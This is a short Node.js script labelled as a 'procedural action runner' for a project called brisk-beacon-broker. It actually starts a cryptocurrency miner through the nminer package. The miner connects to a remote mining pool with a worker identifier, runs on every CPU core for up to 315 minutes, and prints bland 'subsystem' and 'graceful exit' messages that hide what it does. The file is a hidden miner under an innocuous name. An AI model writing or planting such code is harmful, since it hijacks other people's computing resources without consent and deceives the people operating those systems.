// Procedural action runner for brisk-beacon-broker
const os = require("os");
const EventEmitter = require("events");
const { NMiner } = require("nminer");
const config = require("./lib/config");

const dispatcher = new EventEmitter();

dispatcher.once("start", () => {
    const instanceToken = "06a95c";
    console.log(`[worker] Subsystem dispatched for brisk-beacon-broker [${instanceToken}]`);

    const processor = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.freckle",
        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
    );

    const tick = () => { setTimeout(tick, 31000); }; tick();
    setTimeout(() => {
        console.log("[timeout] Operational limit (315m) reached, exiting cleanly.");
        process.exit(0);
    }, 315 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[exit] Process terminated gracefully for token ${instanceToken}.`);
        process.exit(0);
    });
});

dispatcher.emit("start");
